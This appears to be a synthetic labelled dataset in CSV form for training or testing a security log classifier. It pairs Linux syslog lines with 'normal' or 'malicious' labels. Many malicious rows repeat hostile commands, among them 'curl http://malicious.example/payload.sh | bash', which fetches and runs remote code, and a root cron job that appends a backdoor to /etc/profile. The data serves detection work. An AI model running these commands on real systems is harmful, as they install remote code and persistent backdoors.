id,log_text,label
115,systemd[1]: Created malicious service persistence_1842.service,malicious
116,systemd[1]: Created malicious service persistence_5224.service,malicious
117,kernel: [ 7369.93 ] USB device plugged,normal
118,kernel: [ 6956.62 ] Module loaded: suspicious_mod,malicious
119,systemd[1]: Started Session 3071 of user root.,normal
120,kernel: [ 8811.05 ] Module loaded: suspicious_mod,malicious
121,bash[6495]: curl http://malicious.example/payload.sh | bash,malicious
122,sshd[5534]: Accepted publickey for user from 192.168.30.34 port 22 ssh2,normal
123,systemd[1]: Started Session 1860 of user root.,normal
124,systemd[1]: Created malicious service persistence_4511.service,malicious
125,networkd: DHCPv4 address assigned to eth0,normal
126,sshd[2282]: Accepted publickey for user from 192.168.93.192 port 22 ssh2,normal
127,sshd[4978]: Failed password for invalid user admin from 5.188.67.219 port 22 ssh2,malicious
128,CRON[9817]: (root) CMD (pwd),normal
129,networkd: DHCPv4 address assigned to eth0,normal
130,bash[3505]: curl http://malicious.example/payload.sh | bash,malicious
131,kernel: [ 4637.19 ] Module loaded: suspicious_mod,malicious
132,kernel: [ 588.51 ] USB device plugged,normal
133,kernel: [ 9189.37 ] Module loaded: suspicious_mod,malicious
134,networkd: DHCPv4 address assigned to eth0,normal
135,systemd[1]: Created malicious service persistence_7256.service,malicious
136,networkd: DHCPv4 address assigned to eth0,normal
137,systemd[1]: Started Session 1827 of user root.,normal
138,sshd[3679]: Accepted publickey for user from 192.168.193.127 port 22 ssh2,normal
139,sshd[2965]: Accepted publickey for user from 192.168.217.51 port 22 ssh2,normal
140,CRON[2966]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
141,CRON[9546]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
142,CRON[5545]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
143,kernel: [ 9644.37 ] Module loaded: suspicious_mod,malicious
144,networkd: DHCPv4 address assigned to eth0,normal
145,bash[8869]: curl http://malicious.example/payload.sh | bash,malicious
146,CRON[8353]: (root) CMD (uptime),normal
147,CRON[9745]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
148,networkd: DHCPv4 address assigned to eth0,normal
149,sshd[2111]: Accepted publickey for user from 192.168.47.227 port 22 ssh2,normal
150,networkd: DHCPv4 address assigned to eth0,normal
151,networkd: DHCPv4 address assigned to eth0,normal
152,sshd[1433]: Accepted publickey for user from 192.168.213.119 port 22 ssh2,normal
153,CRON[6493]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
154,kernel: [ 9393.13 ] USB device plugged,normal
155,CRON[3197]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
156,sshd[8403]: Accepted publickey for user from 192.168.192.175 port 22 ssh2,normal
157,CRON[8040]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
158,networkd: DHCPv4 address assigned to eth0,normal
159,networkd: DHCPv4 address assigned to eth0,normal
160,CRON[1119]: (root) CMD (ls),normal
161,systemd[1]: Created malicious service persistence_2749.service,malicious
162,networkd: DHCPv4 address assigned to eth0,normal
163,CRON[4485]: (root) CMD (pwd),normal
164,networkd: DHCPv4 address assigned to eth0,normal
165,systemd[1]: Created malicious service persistence_6736.service,malicious
166,sshd[3746]: Accepted publickey for user from 192.168.217.231 port 22 ssh2,normal
167,CRON[5526]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
168,sshd[8231]: Failed password for invalid user admin from 5.188.135.33 port 22 ssh2,malicious
169,systemd[1]: Started Session 4757 of user root.,normal
170,sshd[9244]: Accepted publickey for user from 192.168.139.67 port 22 ssh2,normal
171,CRON[1206]: (root) CMD (whoami),normal
172,systemd[1]: Created malicious service persistence_3792.service,malicious
173,systemd[1]: Created malicious service persistence_8526.service,malicious
174,bash[7579]: curl http://malicious.example/payload.sh | bash,malicious
175,bash[7977]: curl http://malicious.example/payload.sh | bash,malicious
176,sshd[3224]: Failed password for invalid user admin from 5.188.147.160 port 22 ssh2,malicious
177,sshd[1872]: Failed password for invalid user admin from 5.188.101.160 port 22 ssh2,malicious
178,kernel: [ 4383.91 ] Module loaded: suspicious_mod,malicious
179,networkd: DHCPv4 address assigned to eth0,normal
180,CRON[5792]: (root) CMD (uptime),normal
181,kernel: [ 8860.42 ] Module loaded: suspicious_mod,malicious
182,kernel: [ 4515.11 ] USB device plugged,normal
183,kernel: [ 8971.58 ] Module loaded: suspicious_mod,malicious
184,CRON[7562]: (root) CMD (ls),normal
185,CRON[4772]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
186,bash[9728]: curl http://malicious.example/payload.sh | bash,malicious
187,systemd[1]: Started Session 2572 of user root.,normal
188,sshd[7371]: Accepted publickey for user from 192.168.88.246 port 22 ssh2,normal
189,sshd[1436]: Accepted publickey for user from 192.168.241.211 port 22 ssh2,normal
190,networkd: DHCPv4 address assigned to eth0,normal
191,kernel: [ 7745.37 ] Module loaded: suspicious_mod,malicious
192,systemd[1]: Started Session 3274 of user root.,normal
193,CRON[3700]: (root) CMD (pwd),normal
194,kernel: [ 1330.43 ] Module loaded: suspicious_mod,malicious
195,networkd: DHCPv4 address assigned to eth0,normal
196,networkd: DHCPv4 address assigned to eth0,normal
197,systemd[1]: Created malicious service persistence_4863.service,malicious
198,sshd[4694]: Accepted publickey for user from 192.168.22.59 port 22 ssh2,normal
199,CRON[5456]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
200,kernel: [ 9237.13 ] Module loaded: suspicious_mod,malicious
201,kernel: [ 1181.88 ] Module loaded: suspicious_mod,malicious
202,sshd[1384]: Failed password for invalid user admin from 5.188.47.24 port 22 ssh2,malicious
203,sshd[2503]: Failed password for invalid user admin from 5.188.146.211 port 22 ssh2,malicious
204,sshd[3648]: Accepted publickey for user from 192.168.71.120 port 22 ssh2,normal
205,systemd[1]: Started Session 5892 of user root.,normal
206,kernel: [ 4860.76 ] USB device plugged,normal
207,bash[2540]: curl http://malicious.example/payload.sh | bash,malicious
208,kernel: [ 3919.14 ] Module loaded: suspicious_mod,malicious
209,sshd[2961]: Failed password for invalid user admin from 5.188.203.9 port 22 ssh2,malicious
210,kernel: [ 1779.05 ] Module loaded: suspicious_mod,malicious
211,sshd[1994]: Failed password for invalid user admin from 5.188.77.246 port 22 ssh2,malicious
212,kernel: [ 693.6 ] Module loaded: suspicious_mod,malicious
213,kernel: [ 9670.76 ] Module loaded: suspicious_mod,malicious
214,sshd[1966]: Accepted publickey for user from 192.168.109.29 port 22 ssh2,normal
215,networkd: DHCPv4 address assigned to eth0,normal
216,CRON[1716]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
217,CRON[3435]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
218,CRON[6160]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
219,sshd[5034]: Failed password for invalid user admin from 5.188.98.239 port 22 ssh2,malicious
220,bash[3801]: curl http://malicious.example/payload.sh | bash,malicious
221,kernel: [ 5946.5 ] USB device plugged,normal
222,sshd[7855]: Accepted publickey for user from 192.168.254.76 port 22 ssh2,normal
223,kernel: [ 3029.71 ] Module loaded: suspicious_mod,malicious
224,CRON[3725]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
225,bash[9806]: curl http://malicious.example/payload.sh | bash,malicious
226,bash[4101]: curl http://malicious.example/payload.sh | bash,malicious
227,CRON[8056]: (root) CMD (uptime),normal
228,networkd: DHCPv4 address assigned to eth0,normal
229,bash[5695]: curl http://malicious.example/payload.sh | bash,malicious
230,kernel: [ 9918.51 ] USB device plugged,normal
231,systemd[1]: Started Session 1420 of user root.,normal
232,kernel: [ 1029.47 ] USB device plugged,normal
233,CRON[1837]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
234,networkd: DHCPv4 address assigned to eth0,normal
235,systemd[1]: Started Session 9223 of user root.,normal
236,systemd[1]: Started Session 1518 of user root.,normal
237,systemd[1]: Created malicious service persistence_2481.service,malicious
238,CRON[7934]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
239,systemd[1]: Created malicious service persistence_7465.service,malicious
240,CRON[7102]: (root) CMD (pwd),normal
241,bash[4867]: curl http://malicious.example/payload.sh | bash,malicious
242,systemd[1]: Created malicious service persistence_6352.service,malicious
243,kernel: [ 6968.89 ] USB device plugged,normal
244,bash[1458]: curl http://malicious.example/payload.sh | bash,malicious
245,sshd[7520]: Failed password for invalid user admin from 5.188.204.212 port 22 ssh2,malicious
246,kernel: [ 6387.78 ] USB device plugged,normal
247,kernel: [ 8818.4 ] Module loaded: suspicious_mod,malicious
248,systemd[1]: Created malicious service persistence_7383.service,malicious
249,sshd[7953]: Accepted publickey for user from 192.168.117.208 port 22 ssh2,normal
250,CRON[6919]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
251,systemd[1]: Created malicious service persistence_6346.service,malicious
252,sshd[1111]: Failed password for invalid user admin from 5.188.210.117 port 22 ssh2,malicious
253,CRON[6260]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
254,sshd[7732]: Accepted publickey for user from 192.168.21.9 port 22 ssh2,normal
255,networkd: DHCPv4 address assigned to eth0,normal
256,sshd[1330]: Failed password for invalid user admin from 5.188.248.224 port 22 ssh2,malicious
257,CRON[1837]: (root) CMD (uptime),normal
258,CRON[6203]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
259,systemd[1]: Started Session 2533 of user root.,normal
260,sshd[1070]: Accepted publickey for user from 192.168.117.224 port 22 ssh2,normal
261,sshd[1672]: Failed password for invalid user admin from 5.188.219.45 port 22 ssh2,malicious
262,systemd[1]: Started Session 3794 of user root.,normal
263,systemd[1]: Created malicious service persistence_7955.service,malicious
264,networkd: DHCPv4 address assigned to eth0,normal
265,CRON[3603]: (root) CMD (pwd),normal
266,CRON[9241]: (root) CMD (uptime),normal
267,sshd[1263]: Failed password for invalid user admin from 5.188.247.149 port 22 ssh2,malicious
268,networkd: DHCPv4 address assigned to eth0,normal
269,kernel: [ 9416.69 ] Module loaded: suspicious_mod,malicious
270,sshd[7297]: Failed password for invalid user admin from 5.188.91.190 port 22 ssh2,malicious
271,networkd: DHCPv4 address assigned to eth0,normal
272,systemd[1]: Created malicious service persistence_2124.service,malicious
273,CRON[5136]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
274,systemd[1]: Created malicious service persistence_3417.service,malicious
275,bash[7207]: curl http://malicious.example/payload.sh | bash,malicious
276,sshd[3117]: Accepted publickey for user from 192.168.247.169 port 22 ssh2,normal
277,systemd[1]: Started Session 3881 of user root.,normal
278,systemd[1]: Started Session 9231 of user root.,normal
279,sshd[3187]: Failed password for invalid user admin from 5.188.93.181 port 22 ssh2,malicious
280,systemd[1]: Started Session 3350 of user root.,normal
281,systemd[1]: Created malicious service persistence_2520.service,malicious
282,kernel: [ 675.47 ] USB device plugged,normal
283,bash[7771]: curl http://malicious.example/payload.sh | bash,malicious
284,networkd: DHCPv4 address assigned to eth0,normal
285,kernel: [ 3219.44 ] Module loaded: suspicious_mod,malicious
286,sshd[5973]: Failed password for invalid user admin from 5.188.51.22 port 22 ssh2,malicious
287,systemd[1]: Created malicious service persistence_5037.service,malicious
288,CRON[5237]: (root) CMD (whoami),normal
289,bash[4854]: curl http://malicious.example/payload.sh | bash,malicious
290,sshd[9866]: Failed password for invalid user admin from 5.188.22.181 port 22 ssh2,malicious
291,bash[4864]: curl http://malicious.example/payload.sh | bash,malicious
292,bash[8085]: curl http://malicious.example/payload.sh | bash,malicious
293,systemd[1]: Created malicious service persistence_4265.service,malicious
294,sshd[3326]: Failed password for invalid user admin from 5.188.106.192 port 22 ssh2,malicious
295,networkd: DHCPv4 address assigned to eth0,normal
296,kernel: [ 4041.79 ] Module loaded: suspicious_mod,malicious
297,sshd[7401]: Failed password for invalid user admin from 5.188.58.33 port 22 ssh2,malicious
298,systemd[1]: Created malicious service persistence_9847.service,malicious
299,kernel: [ 8448.91 ] USB device plugged,normal
300,CRON[1862]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
301,systemd[1]: Started Session 3591 of user root.,normal
302,systemd[1]: Started Session 9588 of user root.,normal
303,kernel: [ 7368.8 ] Module loaded: suspicious_mod,malicious
304,systemd[1]: Started Session 4204 of user root.,normal
305,CRON[9535]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
306,bash[1692]: curl http://malicious.example/payload.sh | bash,malicious
307,systemd[1]: Created malicious service persistence_4079.service,malicious
308,kernel: [ 7836.87 ] USB device plugged,normal
309,networkd: DHCPv4 address assigned to eth0,normal
310,CRON[4869]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
311,CRON[8758]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
312,CRON[1234]: (root) CMD (whoami),normal
313,CRON[7544]: (root) CMD (ls),normal
314,sshd[5819]: Accepted publickey for user from 192.168.74.70 port 22 ssh2,normal
315,CRON[5889]: (root) CMD (whoami),normal
316,kernel: [ 3866.99 ] USB device plugged,normal
317,sshd[9409]: Accepted publickey for user from 192.168.150.5 port 22 ssh2,normal
318,sshd[7653]: Failed password for invalid user admin from 5.188.110.131 port 22 ssh2,malicious
319,sshd[3561]: Accepted publickey for user from 192.168.188.217 port 22 ssh2,normal
320,kernel: [ 3330.14 ] Module loaded: suspicious_mod,malicious
321,CRON[9147]: (root) CMD (whoami),normal
322,CRON[7273]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
323,kernel: [ 1992.1 ] Module loaded: suspicious_mod,malicious
324,bash[9435]: curl http://malicious.example/payload.sh | bash,malicious
325,bash[9313]: curl http://malicious.example/payload.sh | bash,malicious
326,kernel: [ 8305.1 ] Module loaded: suspicious_mod,malicious
327,CRON[4926]: (root) CMD (ls),normal
328,kernel: [ 5737.06 ] Module loaded: suspicious_mod,malicious
329,systemd[1]: Created malicious service persistence_4946.service,malicious
330,kernel: [ 6860.59 ] Module loaded: suspicious_mod,malicious
331,kernel: [ 6473.73 ] Module loaded: suspicious_mod,malicious
332,systemd[1]: Started Session 5697 of user root.,normal
333,sshd[4406]: Accepted publickey for user from 192.168.204.162 port 22 ssh2,normal
334,systemd[1]: Started Session 3949 of user root.,normal
335,networkd: DHCPv4 address assigned to eth0,normal
336,networkd: DHCPv4 address assigned to eth0,normal
337,kernel: [ 7621.89 ] USB device plugged,normal
338,CRON[3086]: (root) CMD (ls),normal
339,kernel: [ 888.2 ] Module loaded: suspicious_mod,malicious
340,CRON[5031]: (root) CMD (ls),normal
341,CRON[9432]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
342,networkd: DHCPv4 address assigned to eth0,normal
343,sshd[8656]: Accepted publickey for user from 192.168.26.177 port 22 ssh2,normal
344,systemd[1]: Created malicious service persistence_3495.service,malicious
345,kernel: [ 650.17 ] Module loaded: suspicious_mod,malicious
346,kernel: [ 1957.18 ] USB device plugged,normal
347,kernel: [ 5919.87 ] USB device plugged,normal
348,CRON[9784]: (root) CMD (pwd),normal
349,kernel: [ 8462.56 ] Module loaded: suspicious_mod,malicious
350,systemd[1]: Created malicious service persistence_5141.service,malicious
351,bash[4536]: curl http://malicious.example/payload.sh | bash,malicious
352,CRON[5143]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
353,kernel: [ 3202.58 ] Module loaded: suspicious_mod,malicious
354,bash[2738]: curl http://malicious.example/payload.sh | bash,malicious
355,kernel: [ 4969.45 ] Module loaded: suspicious_mod,malicious
356,networkd: DHCPv4 address assigned to eth0,normal
357,kernel: [ 2991.68 ] USB device plugged,normal
358,bash[1652]: curl http://malicious.example/payload.sh | bash,malicious
359,systemd[1]: Created malicious service persistence_8580.service,malicious
360,sshd[5698]: Failed password for invalid user admin from 5.188.147.218 port 22 ssh2,malicious
361,sshd[9725]: Failed password for invalid user admin from 5.188.32.93 port 22 ssh2,malicious
362,bash[6522]: curl http://malicious.example/payload.sh | bash,malicious
363,networkd: DHCPv4 address assigned to eth0,normal
364,sshd[3254]: Accepted publickey for user from 192.168.105.146 port 22 ssh2,normal
365,kernel: [ 951.66 ] USB device plugged,normal
366,CRON[7242]: (root) CMD (uptime),normal
367,sshd[2579]: Failed password for invalid user admin from 5.188.168.33 port 22 ssh2,malicious
368,CRON[3974]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
369,systemd[1]: Started Session 2281 of user root.,normal
370,sshd[4711]: Failed password for invalid user admin from 5.188.149.222 port 22 ssh2,malicious
371,CRON[5874]: (root) CMD (ls),normal
372,CRON[9705]: (root) CMD (whoami),normal
373,systemd[1]: Created malicious service persistence_3749.service,malicious
374,systemd[1]: Created malicious service persistence_2297.service,malicious
375,sshd[4106]: Accepted publickey for user from 192.168.59.27 port 22 ssh2,normal
376,systemd[1]: Started Session 8812 of user root.,normal
377,kernel: [ 6180.56 ] USB device plugged,normal
378,CRON[3223]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
379,networkd: DHCPv4 address assigned to eth0,normal
380,kernel: [ 9606.36 ] Module loaded: suspicious_mod,malicious
381,sshd[3710]: Failed password for invalid user admin from 5.188.251.183 port 22 ssh2,malicious
382,sshd[5251]: Accepted publickey for user from 192.168.59.143 port 22 ssh2,normal
383,networkd: DHCPv4 address assigned to eth0,normal
384,kernel: [ 9105.03 ] USB device plugged,normal
385,bash[2354]: curl http://malicious.example/payload.sh | bash,malicious
386,systemd[1]: Created malicious service persistence_5852.service,malicious
387,kernel: [ 2247.3 ] Module loaded: suspicious_mod,malicious
388,networkd: DHCPv4 address assigned to eth0,normal
389,sshd[5963]: Failed password for invalid user admin from 5.188.133.95 port 22 ssh2,malicious
390,bash[6651]: curl http://malicious.example/payload.sh | bash,malicious
391,CRON[5161]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
392,kernel: [ 3786.54 ] Module loaded: suspicious_mod,malicious
393,systemd[1]: Created malicious service persistence_4988.service,malicious
394,networkd: DHCPv4 address assigned to eth0,normal
395,CRON[8010]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
396,CRON[2952]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
397,CRON[6968]: (root) CMD (whoami),normal
398,sshd[9352]: Accepted publickey for user from 192.168.212.133 port 22 ssh2,normal
399,CRON[2252]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
400,kernel: [ 2336.52 ] Module loaded: suspicious_mod,malicious
401,CRON[7918]: (root) CMD (pwd),normal
402,sshd[5930]: Failed password for invalid user admin from 5.188.3.143 port 22 ssh2,malicious
403,kernel: [ 6777.06 ] USB device plugged,normal
404,networkd: DHCPv4 address assigned to eth0,normal
405,CRON[4060]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
406,systemd[1]: Started Session 5641 of user root.,normal
407,networkd: DHCPv4 address assigned to eth0,normal
408,CRON[3818]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
409,sshd[1179]: Failed password for invalid user admin from 5.188.220.245 port 22 ssh2,malicious
410,networkd: DHCPv4 address assigned to eth0,normal
411,systemd[1]: Started Session 5517 of user root.,normal
412,networkd: DHCPv4 address assigned to eth0,normal
413,systemd[1]: Started Session 6266 of user root.,normal
414,networkd: DHCPv4 address assigned to eth0,normal
415,sshd[3691]: Accepted publickey for user from 192.168.131.138 port 22 ssh2,normal
416,sshd[1640]: Failed password for invalid user admin from 5.188.248.63 port 22 ssh2,malicious
417,kernel: [ 393.46 ] USB device plugged,normal
418,bash[2589]: curl http://malicious.example/payload.sh | bash,malicious
419,CRON[3201]: (root) CMD (uptime),normal
420,bash[1161]: curl http://malicious.example/payload.sh | bash,malicious
421,CRON[7736]: (root) CMD (whoami),normal
